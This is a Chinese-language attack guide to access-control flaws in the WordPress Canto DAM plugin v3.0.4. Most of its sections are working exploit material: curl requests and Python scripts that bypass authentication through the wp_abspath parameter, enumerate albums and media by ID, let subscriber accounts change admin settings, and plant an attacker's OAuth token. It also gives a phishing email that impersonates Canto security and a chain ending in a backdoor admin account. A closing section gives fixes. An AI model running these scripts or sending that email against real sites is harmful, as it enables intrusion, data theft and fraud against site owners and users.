# WordPress Canto 访问控制攻击

## 1. 概述

### 1.1 漏洞描述

WordPress Canto Digital Asset Management (DAM) 插件 v3.0.4 存在严重的访问控制缺陷，包括水平权限绕过 (IDOR)、垂直权限提升、OAuth CSRF 等多种漏洞。插件完全绕过 WordPress 的能力 (capability) 系统，导致未授权访问和权限提升。

### 1.2 受影响组件

| 文件/端点 | 漏洞类型 | 严重等级 | 利用条件 |
|----------|---------|---------|---------|
| `/wp-content/plugins/canto/includes/lib/get.php` | IDOR + 认证绕过 | Critical | 无 |
| `/wp-content/plugins/canto/includes/lib/download.php` | IDOR + 认证绕过 | Critical | 无 |
| `/wp-content/plugins/canto/includes/lib/detail.php` | IDOR + 认证绕过 | Critical | 无 |
| `/wp-content/plugins/canto/includes/lib/tree.php` | IDOR + 认证绕过 | Critical | 无 |
| `/wp-content/plugins/canto/includes/lib/copy-media.php` | IDOR (双重) | Critical | 无 |
| `/wp-admin/admin-ajax.php?action=updateOptions` | 垂直权限提升 | High | 任意用户 |
| `/wp-admin/admin-ajax.php?action=fbc_updateOptions` | 垂直权限提升 | High | 任意用户 |
| `/wp-admin/admin-ajax.php?action=fbc_get_token` | 垂直权限提升 | High | 任意用户 |
| `/wp-admin/options-general.php?page=canto_settings` | OAuth CSRF | Critical | 管理员 |

### 1.3 漏洞成因

**根本原因：**
1. Canto 插件库文件直接通过 HTTP 访问，绕过 WordPress 路由系统
2. 无 `current_user_can()` 能力检查
3. 无对象所有权验证
4. OAuth State 参数未验证
5. 用户可控的认证引导路径

**脆弱代码模式：**
```php
// 认证绕过 (get.php 第 5 行)
require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
// 问题：wp_abspath 用户可控，可跳过认证

// 缺失能力检查 (class-canto.php)
add_action('wp_ajax_updateOptions', array($this, 'updateOptions'));
// 问题：无 current_user_can('manage_options') 检查

// IDOR 漏洞 (get.php 第 31-43 行)
$url = 'https://' . $subdomain . '.' . $app_api . '/api/v1/album/' . $album;
// 问题：无所有权验证，任意用户可访问任意 album
```

### 1.4 WordPress 角色能力模型

| 角色 | 默认能力 | Canto 插件实际检查 |
|------|---------|-----------------|
| Subscriber (订阅者) | read | 无检查 = 所有功能可用 |
| Contributor (贡献者) | read, edit_posts, delete_posts | 无检查 = 所有功能可用 |
| Author (作者) | 贡献者 + publish_posts, upload_files | 无检查 = 所有功能可用 |
| Editor (编辑) | 作者 + edit_others_posts, moderate_comments | 无检查 = 所有功能可用 |
| Administrator (管理员) | 所有能力包括 manage_options | 无检查 = 所有功能可用 |

---

## 2. 水平权限绕过 (IDOR)

### 2.1 Canto Media IDOR

**漏洞原理：**
Canto 插件接受任意 `album`、`id`、`fbc_id` 参数，无所有权验证即可访问对应资源。

**利用方法：**
```bash
# 枚举 Canto 媒体 ID
# 假设 Canto 媒体 ID 为连续整数

# 访问任意媒体详情
curl -s "http://target/wp-content/plugins/canto/includes/lib/detail.php?wp_abspath=/var/www/html&scheme=image&id=1&subdomain=test&app_api=canto.com&token=test"

# 访问任意相册
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&album=1&subdomain=test&app_api=canto.com&token=test"

# 遍历媒体库
for id in $(seq 1 100); do
    response=$(curl -s "http://target/wp-content/plugins/canto/includes/lib/detail.php?wp_abspath=/var/www/html&scheme=image&id=${id}&subdomain=test&app_api=canto.com&token=test")
    if [[ "$response" != *"error"* ]]; then
        echo "[+] Found media ID: ${id}"
    fi
done
```

### 2.2 WordPress Post IDOR (copy-media.php)

**漏洞原理：**
`copy-media.php` 接受任意 `post_id` 参数，将媒体附加到任意文章，无 `current_user_can('edit_post', $post_id)` 检查。

**利用方法：**
```bash
# 需要 WordPress 会话 Cookie
# 低权限用户 (Subscriber) 可将媒体附加到管理员文章

curl -X POST "http://target/wp-content/plugins/canto/includes/lib/copy-media.php" \
  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
  -d "abspath=/var/www/html" \
  -d "fbc_id=1" \
  -d "post_id=1" \
  -d "fbc_scheme=image" \
  -d "fbc_app_token=test" \
  -d "fbc_flight_domain=test" \
  -d "fbc_app_api=canto.com"

# post_id=1 通常是管理员创建的第一篇文章
# 攻击者 (Subscriber) 成功附加媒体 = 垂直权限提升
```

**自动化 IDOR 扫描脚本：**
```python
#!/usr/bin/env python3
import requests

target = "http://target/wp-content/plugins/canto/includes/lib/"
cookies = {"wordpress_logged_in_hash": "victim_session"}

# 测试 post_id IDOR
for post_id in range(1, 101):
    response = requests.post(f"{target}copy-media.php", cookies=cookies, data={
        "abspath": "/var/www/html",
        "fbc_id": "1",
        "post_id": str(post_id),
        "fbc_scheme": "image",
        "fbc_app_token": "test",
        "fbc_flight_domain": "test",
        "fbc_app_api": "canto.com"
    })
    
    if "error" not in response.text.lower():
        print(f"[+] Successfully attached media to post {post_id}")
```

### 2.3 批量 ID 枚举攻击

**场景：** 批量枚举所有可访问的资源 ID

**脚本：**
```python
#!/usr/bin/env python3
import requests
import json

target = "http://target/wp-content/plugins/canto/includes/lib/"
found_resources = []

# 枚举 album ID
print("[*] Enumerating Canto albums...")
for album_id in range(1, 1001):
    try:
        response = requests.get(
            f"{target}get.php?wp_abspath=/var/www/html&album={album_id}&subdomain=test&app_api=canto.com&token=test",
            timeout=5
        )
        
        if response.status_code == 200:
            data = json.loads(response.text)
            if data.get('results') and len(data['results']) > 0:
                found_resources.append({
                    'type': 'album',
                    'id': album_id,
                    'count': len(data['results'])
                })
                print(f"[+] Album {album_id}: {len(data['results'])} items")
    except:
        pass

# 枚举 media ID
print("[*] Enumerating Canto media...")
for media_id in range(1, 1001):
    try:
        response = requests.get(
            f"{target}detail.php?wp_abspath=/var/www/html&scheme=image&id={media_id}&subdomain=test&app_api=canto.com&token=test",
            timeout=5
        )
        
        if response.status_code == 200 and "error" not in response.text.lower():
            found_resources.append({
                'type': 'media',
                'id': media_id
            })
            print(f"[+] Media {media_id} exists")
    except:
        pass

print(f"\n[*] Found {len(found_resources)} accessible resources")
```

---

## 3. 垂直权限提升

### 3.1 AJAX 端点权限提升

**漏洞原理：**
Canto 插件的 AJAX 处理器仅使用 `wp_ajax_` 前缀（要求登录），但未检查 `manage_options` 能力，导致低权限用户可执行管理员操作。

**受影响的 AJAX 操作：**
- `updateOptions` - 更新插件设置
- `fbc_updateOptions` - 更新插件设置（重复）
- `fbc_get_token` - 获取 OAuth 令牌

**利用方法：**
```bash
# 创建低权限账户（如果注册启用）
# 或使用已攻陷的 Subscriber 账户

# Subscriber 执行管理员操作 - 更新插件设置
curl -X POST "http://target/wp-admin/admin-ajax.php" \
  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
  -d "action=updateOptions" \
  -d "duplicates=1" \
  -d "cron=1" \
  -d "schedule=hourly" \
  -d "cron_time_day=1" \
  -d "cron_time_hour=0"

# 预期：成功更新设置（本应仅管理员可用）
```

**验证权限提升：**
```bash
# 检查设置是否被修改
curl -s "http://target/wp-admin/options-general.php?page=canto_settings" \
  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
  | grep -o "schedule.*hourly"

# 如果返回匹配，说明权限提升成功
```

### 3.2 OAuth 设置篡改

**场景：** 低权限用户修改 OAuth 配置

**利用步骤：**
```bash
# 1. Subscriber 修改 Canto API 域名
curl -X POST "http://target/wp-admin/admin-ajax.php" \
  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
  -d "action=fbc_updateOptions" \
  -d "fbc_app_token=ATTACKER_TOKEN" \
  -d "fbc_flight_domain=attacker" \
  -d "fbc_app_api=attacker.com"

# 2. 验证修改
curl -s "http://target/wp-admin/options-general.php?page=canto_settings" \
  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
  | grep "attacker.com"
```

---

## 4. OAuth CSRF 攻击

### 4.1 攻击原理

**OAuth 流程缺陷：**
1. State 参数生成但从未验证
2. State 非随机值（仅包含当前 URL）
3. OAuth 令牌直接来自 URL 参数，无验证
4. 重定向 URI 使用第三方中介

**脆弱代码：**
```php
// State 生成（第 276 行）
$state = urlencode($scheme . '://' . $http_host . $request_url);
// 问题：非随机，可预测，未存储

// 回调处理（第 482-513 行）
if (isset($_GET['token']) && isset($_GET['domain'])) {
    // 无 State 验证！
    update_option('fbc_app_token', $_GET['token']);
    update_option('fbc_flight_domain', $_GET['domain']);
}
```

### 4.2 攻击步骤

**步骤 1：攻击者获取自己的 OAuth 令牌**
```bash
# 攻击者完成自己的 OAuth 流程
# 获得回调参数：
# token=ATTACKER_ACCESS_TOKEN
# refreshToken=ATTACKER_REFRESH_TOKEN
# domain=attacker.canto.com
# app_api=canto.com
```

**步骤 2：构造恶意回调 URL**
```
http://target/wp-admin/options-general.php?page=canto_settings&
    token=ATTACKER_ACCESS_TOKEN&
    refreshToken=ATTACKER_REFRESH_TOKEN&
    domain=attacker.canto.com&
    app_api=canto.com
```

**步骤 3：诱骗管理员访问**

**钓鱼邮件示例：**
```
From: security@canto.com
Subject: 紧急：Canto 集成需要重新授权

尊敬的 WordPress 管理员，

由于安全升级，您的 Canto 集成需要重新授权。
请点击以下链接完成授权：

http://target/wp-admin/options-general.php?page=canto_settings&token=...

如不及时处理，Canto 服务将中断。

Canto 安全团队
```

**步骤 4：管理员访问后，WordPress 链接到攻击者 Canto 账户**
```bash
# 验证攻击成功
curl -b admin_cookies.txt "http://target/wp-admin/options-general.php?page=canto_settings" \
  | grep "attacker.canto.com"
```

### 4.3 攻击影响

- 受害者 WordPress 导入的媒体来自攻击者 Canto 账户
- 攻击者可监控受害者媒体使用模式
- 可注入恶意媒体文件
- 持久化后门直到手动断开

---

## 5. 认证绕过攻击

### 5.1 wp_abspath 参数操纵

**漏洞原理：**
Canto 插件库文件使用用户可控的 `wp_abspath` 参数加载 WordPress，但即使加载成功，认证检查也可被绕过。

**利用方法：**
```bash
# 测试 1：提供无效路径（绕过 WordPress 加载）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/invalid/path&subdomain=test&app_api=canto.com"
# 预期：500 错误（WordPress 未加载，但文件尝试执行）

# 测试 2：提供有效路径（触发 WordPress 认证）
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=canto.com"
# 预期：302 重定向到 /wp-login.php

# 测试 3：路径遍历绕过
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=../../../../../../var/www/html&subdomain=test&app_api=canto.com"
# 预期：可能绕过某些路径检查
```

### 5.2 空路径/Null 字节攻击

**PHP<5.3.4 Null 字节注入：**
```bash
# 使用 Null 字节截断
curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%00"
# 可能绕过路径检查
```

---

## 6. 组合攻击场景

### 6.1 IDOR + 垂直权限提升组合

**攻击流程：**

1. **低权限用户访问任意 Canto 媒体**
```bash
# Subscriber 访问任意媒体
curl -b subscriber_cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&album=999&subdomain=test&app_api=canto.com&token=test"
```

2. **将媒体附加到管理员文章**
```bash
# Subscriber 附加媒体到 post_id=1（管理员文章）
curl -X POST -b subscriber_cookies.txt "http://target/wp-content/plugins/canto/includes/lib/copy-media.php" \
  -d "abspath=/var/www/html&fbc_id=1&post_id=1&fbc_scheme=image&fbc_app_token=test"
```

3. **修改管理员设置**
```bash
# Subscriber 修改插件设置
curl -X POST -b subscriber_cookies.txt "http://target/wp-admin/admin-ajax.php" \
  -d "action=updateOptions&duplicates=1&cron=1"
```

### 6.2 OAuth CSRF + IDOR 组合

**攻击流程：**

1. **OAuth CSRF 链接受害者到攻击者 Canto**
```bash
# 诱骗管理员访问恶意回调
curl "http://target/wp-admin/options-general.php?page=canto_settings&token=ATTACKER_TOKEN&..."
```

2. **通过 IDOR 访问受害者所有媒体**
```bash
# 现在所有媒体请求都通过攻击者 Canto
curl -b admin_cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&album=1&subdomain=attacker&app_api=canto.com"
```

### 6.3 完整权限提升链

**场景：** 从匿名访问到完全控制

**攻击链：**
```
1. LFI 读取 wp-config.php
   → 获得数据库凭证

2. 数据库访问提取会话令牌
   → 获得管理员会话

3. 使用管理员会话修改 OAuth 设置
   → 链接到攻击者 Canto

4. 通过 Canto SSRF 访问内部服务
   → 完全内网访问

5. 建立持久化后门
   → 创建管理员账户
```

---

## 7. 自动化工具

### 7.1 IDOR 扫描器

```python
#!/usr/bin/env python3
import requests
import json
from concurrent.futures import ThreadPoolExecutor

class CantoIDORScanner:
    def __init__(self, target, cookies=None):
        self.target = target
        self.session = requests.Session()
        if cookies:
            self.session.cookies.update(cookies)
        self.found = []
        
    def test_album_idor(self, album_id):
        """测试相册 IDOR"""
        try:
            resp = self.session.get(
                f"{self.target}/wp-content/plugins/canto/includes/lib/get.php",
                params={
                    "wp_abspath": "/var/www/html",
                    "album": album_id,
                    "subdomain": "test",
                    "app_api": "canto.com",
                    "token": "test"
                },
                timeout=5
            )
            if resp.status_code == 200:
                data = json.loads(resp.text)
                if data.get('results'):
                    self.found.append(('album', album_id, len(data['results'])))
                    print(f"[+] Album {album_id}: {len(data['results'])} items")
        except:
            pass
    
    def test_media_idor(self, media_id):
        """测试媒体 IDOR"""
        try:
            resp = self.session.get(
                f"{self.target}/wp-content/plugins/canto/includes/lib/detail.php",
                params={
                    "wp_abspath": "/var/www/html",
                    "scheme": "image",
                    "id": media_id,
                    "subdomain": "test",
                    "app_api": "canto.com",
                    "token": "test"
                },
                timeout=5
            )
            if resp.status_code == 200 and "error" not in resp.text.lower():
                self.found.append(('media', media_id))
                print(f"[+] Media {media_id} accessible")
        except:
            pass
    
    def scan(self, max_id=1000):
        """执行扫描"""
        print(f"[*] Scanning albums (1-{max_id})...")
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.test_album_idor, range(1, max_id + 1))
        
        print(f"[*] Scanning media (1-{max_id})...")
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.test_media_idor, range(1, max_id + 1))
        
        print(f"\n[*] Found {len(self.found)} accessible resources")
        return self.found

# 使用示例
scanner = CantoIDORScanner("http://target")
scanner.scan()
```

### 7.2 权限提升测试器

```python
#!/usr/bin/env python3
import requests

class PrivilegeEscalationTester:
    def __init__(self, target, low_priv_cookies):
        self.target = target
        self.session = requests.Session()
        self.session.cookies.update(low_priv_cookies)
        
    def test_ajax_priv_esc(self):
        """测试 AJAX 权限提升"""
        print("[*] Testing AJAX privilege escalation...")
        
        # 测试 updateOptions
        resp = self.session.post(f"{self.target}/wp-admin/admin-ajax.php", data={
            "action": "updateOptions",
            "duplicates": "1",
            "cron": "1"
        })
        
        if "error" not in resp.text.lower():
            print("[+] SUCCESS: Low-priv user can call updateOptions")
            return True
        return False
    
    def test_copy_media_idor(self, target_post_id=1):
        """测试 copy-media IDOR"""
        print(f"[*] Testing copy-media IDOR (post_id={target_post_id})...")
        
        resp = self.session.post(f"{self.target}/wp-content/plugins/canto/includes/lib/copy-media.php", data={
            "abspath": "/var/www/html",
            "fbc_id": "1",
            "post_id": str(target_post_id),
            "fbc_scheme": "image",
            "fbc_app_token": "test"
        })
        
        if resp.status_code == 200:
            print(f"[+] SUCCESS: Can attach media to post {target_post_id}")
            return True
        return False
    
    def test_oauth_csrf(self):
        """测试 OAuth CSRF（需要管理员权限）"""
        print("[*] Testing OAuth CSRF...")
        # 此测试需要管理员会话
        pass

# 使用示例
cookies = {"wordpress_logged_in_hash": "SUBSCRIBER_SESSION"}
tester = PrivilegeEscalationTester("http://target", cookies)
tester.test_ajax_priv_esc()
tester.test_copy_media_idor()
```

---

## 8. 缓解措施

### 8.1 立即修复

**修复认证绕过：**
```php
// 修复前（脆弱）
require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');

// 修复后
require_once(ABSPATH . '/wp-admin/admin.php');

// 添加显式认证检查
if (!is_user_logged_in()) {
    wp_die('Authentication required', 'Unauthorized', array('response' => 401));
}
```

**修复 IDOR：**
```php
// 添加所有权验证
function user_owns_media($fbc_id) {
    // 检查当前用户是否拥有此媒体
    $user_id = get_current_user_id();
    $owner_id = get_post_meta($fbc_id, 'canto_owner', true);
    return $user_id == $owner_id || current_user_can('manage_options');
}

// 在使用 fbc_id 前检查
if (!user_owns_media($fbc_id)) {
    wp_die('Access denied', 'Unauthorized', array('response' => 403));
}
```

**修复垂直权限提升：**
```php
// 添加能力检查
public function updateOptions() {
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Insufficient permissions');
        wp_die();
    }
    // ... 原有逻辑
}
```

**修复 OAuth CSRF：**
```php
// State 生成
$state = bin2hex(random_bytes(32));
update_option('fbc_oauth_state', $state);

// State 验证
$expected_state = get_option('fbc_oauth_state');
if (!hash_equals($expected_state, $_GET['state'])) {
    wp_die('Invalid OAuth state - possible CSRF attack');
}
delete_option('fbc_oauth_state');
```

### 8.2 防御性配置

**禁止直接访问插件库文件：**
```apache
# .htaccess 或 Apache 配置
<Directory "/var/www/html/wp-content/plugins/canto/includes/lib/">
    Deny from all
</Directory>
```

**WordPress 安全加固：**
```php
// wp-config.php
define('DISALLOW_FILE_EDIT', true);
define('FORCE_SSL_ADMIN', true);
```

---

## 9. 参考资源

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP IDOR Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [WordPress Capability API](https://developer.wordpress.org/apis/security/capabilities/)